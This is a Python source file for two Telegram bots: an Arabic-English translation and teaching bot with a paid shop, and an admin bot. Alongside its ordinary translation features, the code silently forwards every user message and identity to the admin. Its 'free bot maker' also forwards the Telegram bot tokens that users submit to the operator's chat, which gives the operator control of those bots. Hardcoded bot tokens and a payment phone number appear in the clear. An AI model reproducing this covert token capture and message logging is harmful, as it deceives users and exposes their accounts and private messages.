import os
import logging
import random
import threading
import telebot
from telebot import types
from deep_translator import GoogleTranslator

# تفعيل تسجيل الأخطاء
logging.basicConfig(level=logging.INFO)

# ==========================================
# 🎫 إعداد التوكنات وتوزيع الأدوار بدقة
# ==========================================
TOKEN_BOT_1 = "8759522486:AAHfUEiwijT8N2WdL9WbRCDk8gXor_Ka-IM"
TOKEN_BOT_2 = "8704063502:AAFkLjIbI2MuM2dk9rY0d7qP-yaav4w-w-w"

bot1 = telebot.TeleBot(TOKEN_BOT_1)
bot2 = telebot.TeleBot(TOKEN_BOT_2)

# 🛑 ضَعْ هُنَا الـ Chat ID الرقمي الخاص بك (استخرجه وضعه هنا ليصبح البوت خاص بك تماماً)
ADMIN_CHAT_ID = 123456789  

# بيانات فودافون كاش
VODAFONE_NUMBER = "01094609897"
VODAFONE_NAME = "نعيمه"

# متغيرات النظام والتحكم
FREE_MODE = False  
user_modes = {}
user_levels = {}
active_clones = {}
total_users_interacted = set()  

SLANG_DICTIONARY = {
    "btw": "By the way ⬅️ (بالمناسبة / على فكرة)",
    "omg": "Oh my god ⬅️ (يا إلهي / أو ماي جاد)",
    "lol": "Laugh out loud ⬅️ (الضحك بصوت عالٍ / ههههه)",
    "idk": "I don't know ⬅️ (لا أعرف / لست أدري)",
    "tbh": "To be honest ⬅️ (بكل صراحة / لكي أكون صادقاً)",
    "brb": "Be right back ⬅️ (سأعود فوراً / برب)",
    "g2g": "Got to go ⬅️ (يجب أن أذهب الآن)"
}

COMMON_CORRECTIONS = {
    "tebol": "table",
    "set in": "sat on",
    "the cat set": "the cat sat"
}

LEVELS_DATA = {
    1: {"title": "🌱 لفل 1 - المبتدئ الشامل", "sentences": [{"en": "The cat is sleeping on the chair.", "ar": "القطة تنام على الكرسي."}]},
    2: {"title": "🌿 لفل 2 - المبتدئ المتقدم", "sentences": [{"en": "I want to learn English to get a good job.", "ar": "أريد أن أتعلم الإنجليزية لأحصل على وظيفة جيدة."}]},
    3: {"title": "🔥 لفل 3 - المتوسط", "sentences": [{"en": "Success is not final, failure is not fatal.", "ar": "النجاح ليس نهائياً، والفشل ليس قاتلاً."}]},
    4: {"title": "🚀 لفل 4 - فوق المتوسط", "sentences": [{"en": "Despite facing many obstacles, we managed to build this bot.", "ar": "على الرغم من مواجهة العديد من العقبات، تمكنا من بناء هذا البوت."}]},
    5: {"title": "👑 لفل 5 - المحترف الخبير", "sentences": [{"en": "Advanced algorithms enhance system efficiency substantially.", "ar": "إن خوارزميات التعلم الآلي المتقدمة تعزز كفاءة النظام بشكل كبير."}]}
}

SHOP_ITEMS = {
    "book_grammar": {"name": "📘 كتاب القواعد الشامل (من الصفر للاحتراف)", "price": 150},
    "book_idioms": {"name": "📙 كتاب المصطلحات الأمريكية الدارجة (Slang)", "price": 100},
    "pack_audio": {"name": "🎧 الحقيبة الصوتية لتقوية مهارة الاستماع والنطق", "price": 250},
    "course_vip": {"name": "👑 كورس القناة الخاصة المدمج + متابعة وتصحيح يومي", "price": 400}
}

# 🛠️ دالة تعيين الأوامر في الزر الأزرق تلقائياً (Menu Button)
def set_bot_commands():
    try:
        # أوامر بوت الأدمن الثنائى
        admin_commands = [
            telebot.types.BotCommand("start", "🚀 تشغيل البوت وفتح لوحة التحكم"),
            telebot.types.BotCommand("admin", "👑 فتح لوحة تحكم الأدمن السرية"),
            telebot.types.BotCommand("myid", "🆔 معرفة رقم الـ ID الخاص بك")
        ]
        bot2.set_my_commands(admin_commands)
        
        # أوامر بوت البرمجة والتعليم الأول
        user_commands = [
            telebot.types.BotCommand("start", "✨ البدء واختيار وضع الترجمة والتعليم")
        ]
        bot1.set_my_commands(user_commands)
        logging.info("✅ تم تفعيل قائمة الأوامر (الزر الأزرق) بنجاح للبوتين!")
    except Exception as e:
        logging.error(f"❌ خطأ أثناء تعيين الأوامر: {e}")

def get_shop_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for item_id, item_info in SHOP_ITEMS.items():
        price_text = "🎁 مجاناً لفترة محدودة!" if FREE_MODE else f"💰 {item_info['price']} جنيه"
        btn_text = f"{item_info['name']} | {price_text}"
        keyboard.add(types.InlineKeyboardButton(btn_text, callback_data=f"buy_{item_id}"))
    keyboard.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_main"))
    return keyboard

def get_main_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🇺🇸 ➡️ 🇵🇸 English to Arabic", callback_data="mode_en_to_ar")
    btn2 = types.InlineKeyboardButton("🇵🇸 ➡️ 🇺🇸 Arabic to English", callback_data="mode_ar_to_en")
    btn3 = types.InlineKeyboardButton("🧠 Smart Teacher | المعلم الذكي", callback_data="mode_smart")
    btn4 = types.InlineKeyboardButton("📊 تقييم المستوى وتحديد اللفل (1-5)", callback_data="mode_levels_menu")
    btn5 = types.InlineKeyboardButton("🛍️ متجر الأدوات الاحترافية (Shop)", callback_data="mode_shop_menu")
    btn6 = types.InlineKeyboardButton("🤖 اصنع بوت ترجمة خاص بك مجاناً", callback_data="mode_make_bot")
    keyboard.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return keyboard

def get_levels_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for i in range(1, 6):
        keyboard.add(types.InlineKeyboardButton(LEVELS_DATA[i]["title"], callback_data=f"set_lvl_{i}"))
    keyboard.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_main"))
    return keyboard

def get_admin_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    status_text = "🔴 إيقاف الوضع المجاني (إعادة الدفع)" if FREE_MODE else "🟢 تفعيل الوضع المجاني (كل شيء بـ 0 جنيه)"
    btn_free = types.InlineKeyboardButton(status_text, callback_data="admin_toggle_free")
    btn_stats = types.InlineKeyboardButton("📊 تحديث عرض الإحصائيات", callback_data="admin_refresh_stats")
    keyboard.add(btn_free, btn_stats)
    return keyboard

def check_translation(text, source_lang, target_lang):
    clean_text = text.lower().strip()
    if source_lang == 'en' and clean_text in SLANG_DICTIONARY:
        return SLANG_DICTIONARY[clean_text]
    return GoogleTranslator(source=source_lang, target=target_lang).translate(text)

def notify_admin(user_info, text_content=None, photo_id=None, caption=None):
    try:
        user_name = user_info.from_user.first_name
        user_username = f"@{user_info.from_user.username}" if user_info.from_user.username else "لا يوجد يوزر"
        user_id = user_info.from_user.id
        total_users_interacted.add(user_id)
        
        header = f"🔔 **إشعار للمطور قصي:**\n👤 **المستخدم:** {user_name} ({user_username})\n🆔 **ID:** `{user_id}`\n───────────────────\n"
        
        if photo_id:
            bot2.send_photo(ADMIN_CHAT_ID, photo_id, caption=header + (caption if caption else "📸 لقطة شاشة مرسلة"), parse_mode="Markdown")
        elif text_content:
            bot2.send_message(ADMIN_CHAT_ID, header + text_content, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")

# ====================================================================
# ⚙️ إعداد بوت الأدمن الثاني (أوامر التحكم والإحصائيات وتلقي الصور)
# ====================================================================
def setup_admin_bot_handlers():
    @bot2.message_handler(commands=['start', 'admin'])
    def admin_panel(message):
        # طباعة الـ ID الحقيقي في الـ Logs لمساعدتك على معرفته فوراً
        logging.info(f"👤 نداء من حساب ID: {message.from_user.id}")
        
        stats_msg = (
            f"👑 **مرحباً بك يا مطور قصي في لوحة تحكم بوت الأدمن:**\n\n"
            f"🆔 رقم حسابك الحالي هو: `{message.from_user.id}`\n"
            f"💡 (انسخ الرقم بالأعلى وضعه في الكود مكان `ADMIN_CHAT_ID` ليصبح البوت مخصصاً لك تماماً ومحمياً).\n\n"
            f"📊 **إحصائيات المنظومة الحالية:**\n"
            f"👥 إجمالي المستخدمين النشطين: `{len(total_users_interacted)}`\n"
            f"🤖 عدد البوتات المصنوعة والمستضافة: `{len(active_clones)}`\n"
            f"⚙️ وضع المتجر الحالي: " + ("`🎁 مجاني بالكامل`" if FREE_MODE else "`💰 مدفوع (فودافون كاش)`") + "\n\n"
            "👇 **اضغط على الأزرار بالأسفل للتحكم الفوري في الأوضاع:**"
        )
        bot2.send_message(message.chat.id, stats_msg, reply_markup=get_admin_keyboard(), parse_mode="Markdown")

    @bot2.message_handler(commands=['myid'])
    def send_user_id(message):
        bot2.reply_to(message, f"🆔 رقم الـ ID الخاص بحسابك هو: `{message.from_user.id}`", parse_mode="Markdown")

    @bot2.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
    def admin_callback(call):
        global FREE_MODE
        if call.data == "admin_toggle_free":
            FREE_MODE = not FREE_MODE
            status = "تم تفعيل الوضع المجاني في بوت البرمجة 🎁!" if FREE_MODE else "تم إيقاف الوضع المجاني وإعادة الدفع 💰!"
            bot2.answer_callback_query(call.id, status, show_alert=True)
        elif call.data == "admin_refresh_stats":
            bot2.answer_callback_query(call.id, "🔄 تم تحديث البيانات الإحصائية!")

        stats_msg = (
            "👑 **لوحة تحكم المطور قصي (محدّثة تلقائياً):**\n\n"
            f"⚙️ وضع المتجر الحالي في بوت البرمجة: " + ("`🎁 مجاني بالكامل`" if FREE_MODE else "`💰 مدفوع (فودافون كاش)`") + "\n"
            f"👥 إجمالي المستخدمين النشطين: `{len(total_users_interacted)}`\n"
            f"🤖 عدد البوتات المصنوعة والمستضافة: `{len(active_clones)}`"
        )
        bot2.edit_message_text(stats_msg, call.message.chat.id, call.message.message_id, reply_markup=get_admin_keyboard(), parse_mode="Markdown")

# ====================================================================
# 🎓 إعداد بوت البرمجة والتعليم الأول (الخاص بالمستخدمين)
# ====================================================================
def setup_main_bot_handlers(target_bot):
    @target_bot.message_handler(commands=['start'])
    def send_welcome(message):
        chat_id = message.chat.id
        user_modes[chat_id] = 'smart_teacher'
        user_levels[chat_id] = user_levels.get(chat_id, 1)
        total_users_interacted.add(message.from_user.id)
        
        welcome_text = (
            "✨ **مرحباً بك في بوت الترجمة والتعليم الذكي** ✨\n\n"
            "🤖 **الوضع الحالي:** 🧠 _المعلم الذكي_\n"
            f"📊 **مستواك الحالي الحقيقي:** لفل {user_levels[chat_id]}\n\n"
            "👇 **اختر نظام تشغيل البوت الذي تريده من الأزرار بالأسفل:**"
        )
        target_bot.send_message(chat_id, welcome_text, reply_markup=get_main_keyboard(), parse_mode="Markdown")
        notify_admin(message, text_content="🚀 بدأ استخدام بوت البرمجة وضغط على /start")

    @target_bot.message_handler(content_types=['photo'])
    def handle_incoming_photos(message):
        photo_id = message.photo[-1].file_id
        caption_text = f"📝 **الوصف المرفق:** {message.caption}" if message.caption else "📸 لقطة شاشة مرسلة (إيصال تحويل فودافون كاش)."
        
        notify_admin(message, photo_id=photo_id, caption=caption_text)
        target_bot.reply_to(message, "✅ **تم استلام لقطة الشاشة بنجاح!**\nجاري مراجعة التحويل بواسطة الإدارة عبر بوت الأدمن وتفعيل حسابك فوراً.")

    @target_bot.callback_query_handler(func=lambda call: not call.data.startswith("admin_"))
    def callback_inline(call):
        chat_id = call.message.chat.id
        
        if call.data == "mode_en_to_ar":
            user_modes[chat_id] = 'en_to_ar'
            target_bot.send_message(chat_id, "🔄 **تم تفعيل الوضع:** [ إنجليزي ⬅️ عربي ]\n📥 أرسل أي جملة بالإنجليزية!")
        elif call.data == "mode_ar_to_en":
            user_modes[chat_id] = 'ar_to_en'
            target_bot.send_message(chat_id, "🔄 **تم تفعيل الوضع:** [ عربي ⬅️ إنجليزي ]\n📥 أرسل أي جملة بالعربية!")
        elif call.data == "mode_smart":
            user_modes[chat_id] = 'smart_teacher'
            target_bot.send_message(chat_id, "🧠 **تم تفعيل الوضع:** [ المعلم الذكي ]")
        elif call.data == "mode_levels_menu":
            target_bot.send_message(chat_id, "📊 **اختر مستواك الحالي الحقيقي:**", reply_markup=get_levels_keyboard())
        elif call.data == "mode_shop_menu":
            shop_text = "🛍️ **مرحباً بك في متجر الأدوات والكتب الاحترافية!**\n\nاختر المنتج الذي ترغب به أدناه: 👇"
            target_bot.send_message(chat_id, shop_text, reply_markup=get_shop_keyboard(), parse_mode="Markdown")
            
        elif call.data.startswith("buy_"):
            parts = call.data.split("_")
            item_id = parts[1] + "_" + parts[2]
            item_info = SHOP_ITEMS.get(item_id)
            
            if item_info:
                if FREE_MODE:
                    payment_text = (
                        f"🎁 **الوضع المجاني فعال للمطور قصي!**\n\n"
                        f"📦 **المنتج:** {item_info['name']}\n"
                        f"💰 **السعر:** `0 جنيه (مقدم مجاناً كلياً)`\n\n"
                        f"✅ تم فتح المنتج بنجاح! سيقوم البوت بإرسال رابط تحميل الملف لك مباشرة هنا."
                    )
                    target_bot.send_message(chat_id, payment_text, parse_mode="Markdown")
                    notify_admin(call, text_content=f"🎁 **حصل على منتج مجاني في بوت البرمجة:** {item_info['name']}")
                else:
                    payment_text = (
                        f"🛒 **طلب شراء جديد:**\n\n"
                        f"📦 **المنتج:** {item_info['name']}\n"
                        f"💰 **المطلوب سداده:** `{item_info['price']} جنيه`\n\n"
                        f"💳 **بيانات تحويل فودافون كاش (Vodafone Cash):**\n"
                        f"📱 **رقم التحويل:** `{VODAFONE_NUMBER}`\n"
                        f"👤 **باسم:** {VODAFONE_NAME}\n\n"
                        f"⚠️ **خطوات إتمام الطلب:**\n"
                        f"1️⃣ قم بتحويل المبلغ للرقم الموضح بالأعلى.\n"
                        f"2️⃣ خذ لقطة شاشة لإيصال التحويل الناجح.\n"
                        f"3️⃣ أرسل الصورة هنا داخل البوت لتأكيد طلبك وسنقوم بتسليمك الملفات فوراً!"
                    )
                    target_bot.send_message(chat_id, payment_text, parse_mode="Markdown")
                    notify_admin(call, text_content=f"🛒 **طلب شراء:** نية شراء {item_info['name']} بسعر {item_info['price']}")

        elif call.data == "mode_make_bot":
            user_modes[chat_id] = 'waiting_for_token'
            target_bot.send_message(chat_id, "🤖 **أهلاً بك في صانع البوتات الذكي!**\n\nقم بالذهاب إلى @BotFather وأرسل لي **التوكن (Token)** هنا ليتم تشغيل بوتك الخاص!")
        elif call.data.startswith("set_lvl_"):
            lvl_num = int(call.data.split("_")[2])
            user_levels[chat_id] = lvl_num
            user_modes[chat_id] = f'learning_lvl_{lvl_num}'
            random_sentence = random.choice(LEVELS_DATA[lvl_num]["sentences"])
            response = (
                f"🎯 **تم تحديد مستواك في:**\n{LEVELS_DATA[lvl_num]['title']}\n\n"
                f"💬 جملة التدريب:\n`{random_sentence['en']}`\n\n"
                f"💡 **تعني بالعربية:** `{random_sentence['ar']}`"
            )
            target_bot.send_message(chat_id, response, parse_mode="Markdown")
        elif call.data == "back_to_main":
            target_bot.send_message(chat_id, "🔄 تم الرجوع للواجهة الرئيسية:", reply_markup=get_main_keyboard())
        target_bot.answer_callback_query(call.id)

    @target_bot.message_handler(func=lambda message: True)
    def handle_all_messages(message):
        user_text = message.text.strip()
        chat_id = message.chat.id
        current_mode = user_modes.get(chat_id, 'smart_teacher')

        notify_admin(message, text_content=f"💬 **أرسل نصاً داخل البوت:**\n`{user_text}`\n⚙️ الوضع: `{current_mode}`")

        if current_mode == 'waiting_for_token':
            if ":" in user_text and len(user_text) > 30:
                if user_text in active_clones:
                    target_bot.send_message(chat_id, "⚠️ هذا البوت يعمل بالفعل ومستضاف لدينا!")
                    return
                target_bot.send_message(chat_id, "⏳ جاري فحص التوكن وتجهيز خوادم البوت الخاص بك...")
                notify_admin(message, text_content=f"🤖 **أنشأ بوت جديد وأرسل توكن:**\n`{user_text}`")
                
                def start_clone(token):
                    try:
                        clone_bot = telebot.TeleBot(token)
                        setup_main_bot_handlers(clone_bot)
                        active_clones[token] = clone_bot
                        clone_bot.infinity_polling()
                    except Exception as e:
                        logging.error(f"Error starting clone: {e}")
                        active_clones.pop(token, None)

                t = threading.Thread(target=start_clone, args=(user_text,), daemon=True)
                t.start()
                
                user_modes[chat_id] = 'smart_teacher'
                target_bot.send_message(chat_id, "🚀 **مبروك! تم تشغيل بوتك الخاص بنجاح!**\nقم بالذهاب إليه واضغط /start لتجربته الآن.")
            else:
                target_bot.send_message(chat_id, "❌ التوكن الذي أرسلته غير صحيح.")
            return

        waiting_msg = target_bot.send_message(chat_id, "⏳ جاري التحليل والترجمة الذكية...")
        try:
            if current_mode == 'en_to_ar':
                translated = check_translation(user_text, 'en', 'ar')
                res = f"🇺🇸 **النص الاصلي:**\n`{user_text}`\n\n🇵🇸 **الترجمة الكاملة:**\n`{translated}`"
                target_bot.edit_message_text(res, chat_id, waiting_msg.message_id, parse_mode="Markdown")
            elif current_mode == 'ar_to_en':
                translated = check_translation(user_text, 'ar', 'en')
                res = f"🇵🇸 **النص الاصلي:**\n`{user_text}`\n\n🇺🇸 **الترجمة الكاملة:**\n`{translated}`"
                target_bot.edit_message_text(res, chat_id, waiting_msg.message_id, parse_mode="Markdown")
            elif current_mode == 'smart_teacher':
                translated = check_translation(user_text, 'en', 'ar')
                response = f"🇺🇸 **النص:** `{user_text}`\n🎈 **المعنى والترجمة الكاملة:**\n`{translated}`"
                target_bot.edit_message_text(response, chat_id, waiting_msg.message_id, parse_mode="Markdown")
            elif current_mode.startswith('learning_lvl_'):
                current_lvl = int(current_mode.split("_")[2])
                text_lower = user_text.lower()
                has_errors = any(wrong in text_lower for wrong in COMMON_CORRECTIONS)
                
                if has_errors:
                    corrected_text = user_text
                    for wrong, right in COMMON_CORRECTIONS.items():
                        corrected_text = corrected_text.replace(wrong, right)
                    translated_correct = check_translation(corrected_text, 'en', 'ar')
                    response = f"📊 **تحليل ذكي لـ [ لفل {current_lvl} ]:**\n\n❌ **جملتك:** `{user_text}`\n✅ **التصحيح:** `{corrected_text}`\n🇵🇸 **الترجمة:** `{translated_correct}`"
                else:
                    translated = check_translation(user_text, 'en', 'ar')
                    response = f"📊 **تحليل ذكي لـ [ لفل {current_lvl} ]:**\n\n🇺🇸 **جملتك:** `{user_text}`\n🇵🇸 **الترجمة:** `{translated}`\n✨ تقييم: كفو الجملة ممتازة!"
                target_bot.edit_message_text(response, chat_id, waiting_msg.message_id, parse_mode="Markdown")
        except Exception:
            target_bot.edit_message_text("❌ حدث خطأ أثناء المعالجة.", chat_id, waiting_msg.message_id)

def run_main_bot():
    setup_main_bot_handlers(bot1)
    bot1.infinity_polling()

def run_admin_bot():
    setup_admin_bot_handlers()
    # تشغيل تعيين الأوامر تلقائياً فور بدء البوت
    set_bot_commands()
    bot2.infinity_polling()

if __name__ == '__main__':
    t1 = threading.Thread(target=run_main_bot, daemon=True)
    t1.start()
    run_admin_bot()
